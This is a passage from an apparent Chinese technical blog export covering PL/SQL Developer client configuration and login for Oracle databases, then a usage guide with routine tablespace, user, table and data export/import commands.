<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908095033468.png" alt="image-20200908095033468"></p>
<h2 id="4-PLSQL登陆"><a href="#4-PLSQL登陆" class="headerlink" title="4.PLSQL登陆"></a>4.PLSQL登陆</h2><p>写在前面，请务必细心，不然到时候排错非常麻烦</p>
<p>PLSQL登陆分远程oracle数据库（linux资产）登陆和本地oracle数据库（windows资产）登陆</p>
<p>首先需要知道oracle数据库的版本</p>
<p>如何知道oracle数据库的版本</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908100626105.png" alt="image-20200908100626105"></p>
<p>然后去官网下载对应客户端的版本</p>
<p>官网链接：<a href="https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html</a></p>
<p>下载下来对应的客户端版本后将其解压到存放的目录，我这里解压到D盘</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908101304278.png" alt="image-20200908101304278"></p>
<p>然后打开“PLSQL Developer 12 (64 bit)”，这次也是不要登录，然后依次点击“配置”，“首选项”</p>
<p>如果是远程数据库，则“oracle主目录名”填写刚才解压的简化客户端的位置</p>
<p>“OCI库”填写解压的客户端位置下的oci.dll然后点击左下角的“应用“和”确定“，然后重启即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908101448269.png" alt="image-20200908101448269"></p>
<p>如果是本地数据库，则“oracle主目录名”填写oracle数据库安装的位置</p>
<p>“OCI库”填写解压的客户端位置下的oci.dll然后点击左下角的“应用“和”确定“，然后重启即可，这里就不放图演示了</p>
<p>然后到解压简化客户端的主目录下，创建目录“NETWORK”，然后进入到目录“NETWORK”中继续创建目录“ADMIN”，然后进入到目录“ADMIN”中创建“tnsnames.ora”，创建成功图如下</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908102151912.png" alt="image-20200908102151912"></p>
<p>tnsnames.ora文件中内容为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ORCL =</span><br><span class="line">  (DESCRIPTION =</span><br><span class="line">    (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.200.154)(PORT = 1521))</span><br><span class="line">    (CONNECT_DATA =</span><br><span class="line">      (SERVER = DEDICATED)</span><br><span class="line">      (SERVICE_NAME = orcl)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line"><span class="meta">#</span><span class="bash">ORCL 第一行的ORCL是将要显示在plsql登陆界面database下拉框里面的内容</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HOST 后面填写远程数据库的IP地址，如果是本地数据库，填写本地IP地址即可</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PORT 默认端口是1521，如果更改了默认端口，就需要填写更改过后的端口</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SERVICE_NAME = orcl 此处的orcl是自己使用DBCA建库时自己设置的名称</span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果有需要更改这几项即可</span></span><br></pre></td></tr></table></figure>

<p>然后打开PLSQL，进行登录</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908103858084.png" alt="image-20200908103858084"></p>
<p>登陆上之后，可以选择“当前用户”，“my objects”然后打开“tables”进行查看</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908104343219.png" alt="image-20200908104343219"></p>
<p>如果能查看到表，需要在sqlplus中创建表，然后授权，这样才能在plsql中查看到表</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908104127821.png" alt="image-20200908104127821"></p>
<p>如果没有任何一个表，而且确定之前的操作没有任何错误，那么请登陆上sysdba，将该用户解锁</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[oracle@oracle ~]$ sqlplus / as sysdba</span><br><span class="line"><span class="meta">SQL&gt;</span><span class="bash"> alter user system account unlock;</span></span><br><span class="line">User altered.</span><br></pre></td></tr></table></figure>

<p>这样再进行登录就可以看到数据了</p>
<p>至此PLSQL的安装、汉化、破解、登录教学就到此结束了</p>
]]></content>
      <categories>
        <category>PLSQL</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>PLSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PLSQL使用方法详解</title>
    <url>/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PLSQL使用方法详解"><a href="#PLSQL使用方法详解" class="headerlink" title="PLSQL使用方法详解"></a>PLSQL使用方法详解</h1><ol>
<li>PLSQL这个工具专门为oracle开发的（它只能连接oracle数据库）</li>
<li>很多工具都可以连接oracle数据库（常用的有navicat、toad、plsql等）</li>
</ol>
<h2 id="1-1-登录"><a href="#1-1-登录" class="headerlink" title="1.1 登录"></a>1.1 登录</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135013218.png" alt="image-20200908135013218"></p>
<h2 id="1-2-登录信息保存功能设置"><a href="#1-2-登录信息保存功能设置" class="headerlink" title="1.2 登录信息保存功能设置"></a>1.2 登录信息保存功能设置</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135113864.png" alt="image-20200908135113864"></p>
<p>这样第一次通过用户名/密码登录某数据库后，下次就不用再输入用户名/密码了。</p>
<h2 id="1-3-切换数据库连接"><a href="#1-3-切换数据库连接" class="headerlink" title="1.3 切换数据库连接"></a>1.3 切换数据库连接</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135351997.png" alt="image-20200908135351997"></p>
<h2 id="1-4-SQL执行"><a href="#1-4-SQL执行" class="headerlink" title="1.4 SQL执行"></a>1.4 SQL执行</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135507954.png" alt="image-20200908135507954"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135838186.png" alt="image-20200908135838186"></p>
<p>注意：选中要执行的语句，再执行，否则将执行所有SQL语句。</p>
<p><strong>执行快捷键为：F8</strong></p>
<h2 id="1-5-查看数据库表结构"><a href="#1-5-查看数据库表结构" class="headerlink" title="1.5 查看数据库表结构"></a>1.5 查看数据库表结构</h2><p>在如下界面，按住Ctrl键并将鼠标移动到一个表名，此时表名变了颜色并出现下划线：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908135937404.png" alt="image-20200908135937404"></p>
<p>点击表名，便可显示表结构，如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908140014402.png" alt="image-20200908140014402"></p>
<h2 id="1-6-SQL注释"><a href="#1-6-SQL注释" class="headerlink" title="1.6 SQL注释"></a>1.6 SQL注释</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908140744098.png" alt="image-20200908140744098"></p>
<h2 id="1-7-修改、插入行、删除行并保存"><a href="#1-7-修改、插入行、删除行并保存" class="headerlink" title="1.7 修改、插入行、删除行并保存"></a>1.7 修改、插入行、删除行并保存</h2><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>在SELECT语句后加FOR UPDATE，再执行，结果如下：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908142013016.png" alt="image-20200908142013016"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908142242117.png" alt="image-20200908142242117"></p>
<p>修改完后先点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235350614?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">)，再点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235353944?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">)，最后点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235359575?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">)进行保存（COMMIT），或着点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235404621?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">恢复（ROLLBACK）。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908142420658.png" alt="image-20200908142420658"></p>
<p>然后我们重新查询一下数据是否真的改变了</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908142645077.png" alt="image-20200908142645077"></p>
<h3 id="插入行"><a href="#插入行" class="headerlink" title="插入行"></a>插入行</h3><p>在SELECT语句后加FOR UPDATE，执行后，点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235425434?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">)，然后点击<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622235439515?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">，插入一空行；较新的版本插入一行的图标如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908143205451.png" alt="image-20200908143205451"></p>
<p>回到sqlplus中，查看是否修改成功</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908143255474.png" alt="image-20200908143255474"></p>
<h2 id="1-8导入导出表格数据"><a href="#1-8导入导出表格数据" class="headerlink" title="1.8导入导出表格数据"></a>1.8导入导出表格数据</h2><h3 id="导出表格数据"><a href="#导出表格数据" class="headerlink" title="导出表格数据"></a>导出表格数据</h3><p>查询出结果后，点击结果左上角，进行全选；</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908143536369.png" alt="image-20200908143536369"></p>
<p>然后，点击右键，选“导出结果”，然后选择子菜单中的“Excel file”进行导出</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908144206908.png" alt="image-20200908144206908"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908144250877.png" alt="image-20200908144250877"></p>
<p>然后去对应的保存地方，打开查看数据，如下图</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908144338683.png" alt="image-20200908144338683"></p>
<h3 id="导入表格数据"><a href="#导入表格数据" class="headerlink" title="导入表格数据"></a>导入表格数据</h3><p>直接在Excel表中复制行，粘贴到PLSQL的查询结果区即可。（注意Excel中多加一列）</p>
<h2 id="1-9-更改默认执行Rollbalk"><a href="#1-9-更改默认执行Rollbalk" class="headerlink" title="1.9 更改默认执行Rollbalk"></a>1.9 更改默认执行Rollbalk</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908144540724.png" alt="image-20200908144540724"></p>
<p>这样如果一旦SQL语句执行无法停止或PL/SQL出现死机，强行退出时，将不会自动<img src= "/img/loading.gif" data-src="https://img-blog.csdn.net/20180622234918434?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lIQzIxMTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img">Commit，保护数据安全。</p>
<h2 id="2-1-创建表空间"><a href="#2-1-创建表空间" class="headerlink" title="2.1 创建表空间"></a>2.1 创建表空间</h2><p>1、在SQL窗口中执行以下SQL代码。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">格式: <span class="keyword">create</span> <span class="keyword">tablespace</span> 表空间名 <span class="keyword">datafile</span> <span class="string">'数据文件名'</span> <span class="keyword">size</span> 表空间大小</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">tablespace</span> data_test <span class="keyword">datafile</span> <span class="string">'/data/oracle/oradata/orcl/data1.dbf'</span> <span class="keyword">size</span> <span class="number">2000</span>M;</span><br></pre></td></tr></table></figure>

<p>2、创建临时表空间，这里也可不创建临时表空间，使用默认的temp也可以。代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TEMPORARY</span> <span class="keyword">TABLESPACE</span> FJFEDW_TEMP</span><br><span class="line">TEMPFILE <span class="string">'C:\app\Administrator\oradata\orcl\FJFEDW_TEMP.DBF'</span></span><br><span class="line"><span class="keyword">SIZE</span> <span class="number">32</span>M</span><br><span class="line"><span class="keyword">AUTOEXTEND</span> <span class="keyword">ON</span></span><br><span class="line"><span class="keyword">NEXT</span> <span class="number">32</span>M <span class="keyword">MAXSIZE</span> <span class="number">2048</span>M</span><br><span class="line"><span class="keyword">EXTENT</span> <span class="keyword">MANAGEMENT</span> <span class="keyword">LOCAL</span>;</span><br></pre></td></tr></table></figure>

<p>3、这个过程可能出现ORA-02180: invalid option for CREATE TABLESPACE这个报错。这个可能是像网上其他帖子上说的一样语句有误。但是我之前出现的原因是权限不足。换个权限高的用户创建就好了。</p>
<h2 id="2-2-创建用户"><a href="#2-2-创建用户" class="headerlink" title="2.2 创建用户"></a>2.2 创建用户</h2><p>写在前面，创建用户属于高级操作，请使用具有高级权限的账号，如system进行操作</p>
<p>1、在新建中找到用户选项</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908144931534.png" alt="image-20200908144931534"></p>
<p>2、填写用户名密码，选择之前创建的表空间。概要文件选择默认的。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908145139286.png" alt="image-20200908145139286"></p>
<p>3、设置角色权限</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908145250060.png" alt="image-20200908145250060"></p>
<p>4、设置系统权限</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908145322802.png" alt="image-20200908145322802"></p>
<p>5、限额设置</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908145348085.png" alt="image-20200908145348085"></p>
<h2 id="2-3-用刚创建的用户登录，建表"><a href="#2-3-用刚创建的用户登录，建表" class="headerlink" title="2.3 用刚创建的用户登录，建表"></a>2.3 用刚创建的用户登录，建表</h2><p>1、新建表，填写表名，注释。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908150028254.png" alt="image-20200908150028254"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908150122052.png" alt="image-20200908150122052"></p>
<p>2、填写字段及其类型。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908150258308.png" alt="image-20200908150258308"></p>
<p>3、选择设置主键。（或者外键，这里设置的是主键。还可以设置索引等）</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908150357949.png" alt="image-20200908150357949"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908150416539.png" alt="image-20200908150416539"></p>
<h2 id="2-4-数据库导入导出"><a href="#2-4-数据库导入导出" class="headerlink" title="2.4 数据库导入导出"></a>2.4 数据库导入导出</h2><p>（这个内容比较多。这里有个比较详尽的文章。原文链接在下方。自己也摘录了一下，方便以后查看。）</p>
<h3 id="oracle11g数据库导入导出："><a href="#oracle11g数据库导入导出：" class="headerlink" title="oracle11g数据库导入导出："></a>oracle11g数据库导入导出：</h3><p><strong>①:传统方式——exp(导出)和(imp)导入：<br>②:数据泵方式——expdp导出和（impdp）导入;<br>③:第三方工具——PL/sql Develpoer;</strong></p>
<h4 id="一、什么是数据库导入导出？"><a href="#一、什么是数据库导入导出？" class="headerlink" title="一、什么是数据库导入导出？"></a>一、什么是数据库导入导出？</h4><p>oracle11g数据库的导入/导出，就是我们通常所说的oracle数据的还原/备份。<br>数据库导入:把.dmp 格式文件从本地导入到数据库服务器中(本地oracle测试数据库中);<br>数据库导出:把数据库服务器中的数据(本地oracle测试数据库中的数据),导出到本地生成.dmp格式文件。<br>.dmp 格式文件：就是oracle数据的文件格式(比如视频是.mp4 格式,音乐是.mp3 格式);</p>
<h4 id="二、二者优缺点描述："><a href="#二、二者优缺点描述：" class="headerlink" title="二、二者优缺点描述："></a>二、二者优缺点描述：</h4><h5 id="1-exp-imp"><a href="#1-exp-imp" class="headerlink" title="1.exp/imp:"></a>1.exp/imp:</h5><p>优点:代码书写简单易懂,从本地即可直接导入，不用在服务器中操作，降低难度，减少服务器上的操作也就 保证了服务器上数据文件的安全性。<br>缺点：这种导入导出的速度相对较慢，合适数据库数据较少的时候。如果文件超过几个G，大众性能的电 脑，至少需要4~5个小时左右。</p>
<h5 id="2-expdp-impdp"><a href="#2-expdp-impdp" class="headerlink" title="2.expdp/impdp:"></a>2.expdp/impdp:</h5><p>优点:导入导出速度相对较快,几个G的数据文件一般在1~2小时左右。<br>缺点:代码相对不易理解,要想实现导入导出的操作，必须在服务器上创建逻辑目录(不是真正的目录)。我们 都知道数据库服务器的重要性，所以在上面的操作必须慎重。所以这种方式一般由专业的程序人员来完成(不一定是DBA(数据库管理员)来干,中小公司可能没有DBA)。</p>
<h5 id="3-PL-sql-Develpoer"><a href="#3-PL-sql-Develpoer" class="headerlink" title="3.PL/sql Develpoer:"></a>3.PL/sql Develpoer:</h5><p>优点：封装了导入导出命令，无需每次都手动输入命令。方便快捷，提高效率。<br>缺点：长时间应用会对其产生依赖，降低对代码执行原理的理解。</p>
<h4 id="三、特别强调："><a href="#三、特别强调：" class="headerlink" title="三、特别强调："></a>三、特别强调：</h4><p>目标数据库:数据即将导入的数据库(一般是项目上正式数据库);<br>源数据库:数据导出的数据库(一般是项目上的测试数据库);<br>1.目标数据库要与源数据库有着名称相同的表空间。<br>2.目标数据在进行导入时，用户名尽量相同(这样保证用户的权限级别相同)。<br>3.目标数据库每次在进行数据导入前，应做好数据备份，以防数据丢失。<br>4.使用数据泵时,一定要现在服务器端建立可用的逻辑目录，并检查是否可用。<br>5.弄清是导入导出到相同版本还是不同版本(oracle10g版本与oracle11g版本)。<br>6.目标数据导入前,弄清楚是数据覆盖(替换),还是仅插入新数据或替换部分数据表。<br>7.确定目标数据库磁盘空间是否足够容纳新数据，是否需要扩充表空间。<br>8.导入导出时注意字符集是否相同，一般Oracle数据库的字符集只有一个，并且固定，一般不改变。<br>9.导出格式介绍:<br> 　 dmp格式：.dmp是二进制文件，可跨平台，还能包含权限，效率好；<br> 　 sql格式：.sql格式的文件，可用文本编辑器查看，通用性比较好，效率不如第一种，适合小数据量导入导出。尤其注意的是表中不能有大字段 （blob,clob,long），如果有，会报错；<br> 　 pde格式：.pde格式的文件，.pde为PL/SQL Developer自有的文件格式，只能用PL/SQL Developer工具导入导出，不能用文本编辑器查看；<br>10.确定操作者的账号权限。</p>
<h4 id="四、二者的导入导出方法："><a href="#四、二者的导入导出方法：" class="headerlink" title="四、二者的导入导出方法："></a>四、二者的导入导出方法：</h4><h5 id="1、传统方法："><a href="#1、传统方法：" class="headerlink" title="1、传统方法："></a>1、传统方法：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通用命令:exp(imp) username&#x2F;password@SERVICENAME:1521 file&#x3D;“e:\temp.dmp” full &#x3D; y;</span><br></pre></td></tr></table></figure>

<p>数据库导出举例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp xinxiaoyong&#x2F;123456@127.0.0.1:1521 file&#x3D;“e:\temp.dmp” full &#x3D; y;</span><br><span class="line"></span><br><span class="line">exp:导出命令，导出时必写。</span><br><span class="line">imp:导入命令，导入时必写,每次操作，二者只能选择一个执行。</span><br><span class="line">username:导出数据的用户名，必写;</span><br><span class="line">password:导出数据的密码，必写;</span><br><span class="line">@:地址符号，必写;</span><br><span class="line">SERVICENAME:Oracle的服务名，必写;</span><br><span class="line">1521:端口号，1521是默认的可以不写,非默认要写;</span><br><span class="line">file&#x3D;“e:\temp.dmp” : 文件存放路径地址，必写;</span><br><span class="line">full&#x3D;y :表示全库导出。可以不写，则默认为no,则只导出用户下的对象;</span><br></pre></td></tr></table></figure>

<p>方法细分：</p>
<h6 id="1-完全导入导出："><a href="#1-完全导入导出：" class="headerlink" title="1.完全导入导出："></a>1.完全导入导出：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp(imp) username&#x2F;password@SERVICENAME:1521 file&#x3D;“e:\temp.dmp” full &#x3D; y;</span><br></pre></td></tr></table></figure>

<h6 id="2-部分用户表table导入导出："><a href="#2-部分用户表table导入导出：" class="headerlink" title="2.部分用户表table导入导出："></a>2.部分用户表table导入导出：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp(imp) username&#x2F;password@SERVICENAME:1521 file&#x3D;“e:\temp.dmp” tabels&#x3D; (table1,table2,table3,…);</span><br></pre></td></tr></table></figure>

<h6 id="3-表空间tablespaces导入导出："><a href="#3-表空间tablespaces导入导出：" class="headerlink" title="3.表空间tablespaces导入导出："></a>3.表空间tablespaces导入导出：</h6><p>一个数据库实例可以有N个表空间(tablespace)，一个表空间下可以有N张表(table)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp(imp) username&#x2F;password@SERVICENAME:1521 file&#x3D;“e:\temp.dmp” tablespaces&#x3D; (tablespace1,tablespace2,tablespace3,…);</span><br></pre></td></tr></table></figure>

<h6 id="4-用户名username对象导入导出："><a href="#4-用户名username对象导入导出：" class="headerlink" title="4.用户名username对象导入导出："></a>4.用户名username对象导入导出：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp(imp) username&#x2F;password@SERVICENAME:1521 file&#x3D;“e:\temp.dmp” owner(username1,username2,username3);</span><br></pre></td></tr></table></figure>

<h5 id="2、数据泵方法："><a href="#2、数据泵方法：" class="headerlink" title="2、数据泵方法："></a>2、数据泵方法：</h5><h6 id="创建directory"><a href="#创建directory" class="headerlink" title="创建directory:"></a>创建directory:</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp(impdp) username&#x2F;password@SERVICENAME:1521 schemas&#x3D;username dumpfile&#x3D;file1.dmp logfile&#x3D;file1.log directory&#x3D;testdata1 remap_schema&#x3D;test:test;</span><br></pre></td></tr></table></figure>

<h6 id="数据库导出举例"><a href="#数据库导出举例" class="headerlink" title="数据库导出举例:"></a>数据库导出举例:</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp xinxiaoyong&#x2F;123456@127.0.0.1:1521 schemas&#x3D;xinxiaoyong dumpfile&#x3D;test.dmp logfile&#x3D;test.log directory&#x3D;testdata1;</span><br></pre></td></tr></table></figure>

<h6 id="1-查看表空间："><a href="#1-查看表空间：" class="headerlink" title="1.查看表空间："></a>1.查看表空间：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *　from dba_tablespaces;</span><br></pre></td></tr></table></figure>

<h6 id="2-查看管理理员目录"><a href="#2-查看管理理员目录" class="headerlink" title="2.查看管理理员目录"></a>2.查看管理理员目录</h6><p>(同时查看操作系统是否存在，因为Oracle并不关心该目录是否存在，如果不存 在，则出错)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *　from dba_directories;</span><br></pre></td></tr></table></figure>

<h6 id="3-创建逻辑目录"><a href="#3-创建逻辑目录" class="headerlink" title="3.创建逻辑目录"></a>3.创建逻辑目录</h6><p>该命令不会在操作系统创建真正的目录，最好以system等管理员创建。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create directory testdata1 as ‘d:\test\dump’;</span><br></pre></td></tr></table></figure>

<h6 id="4-给xinxiaoyong用户赋予在指定目录的操作权限，最好以system等管理员赋予。"><a href="#4-给xinxiaoyong用户赋予在指定目录的操作权限，最好以system等管理员赋予。" class="headerlink" title="4.给xinxiaoyong用户赋予在指定目录的操作权限，最好以system等管理员赋予。"></a>4.给xinxiaoyong用户赋予在指定目录的操作权限，最好以system等管理员赋予。</h6><p>//xinxiaoyong 是用户名(123456是用户密码)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant read,write on directory testdata1 to xinxiaoyong;</span><br></pre></td></tr></table></figure>

<h6 id="5-导出数据"><a href="#5-导出数据" class="headerlink" title="5.导出数据"></a>5.导出数据</h6><p>1)按用户导 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp xinxiaoyong&#x2F;123456@orcl schemas&#x3D;xinxiaoyong dumpfile&#x3D;expdp.dmp directory&#x3D;testdata1;</span><br></pre></td></tr></table></figure>

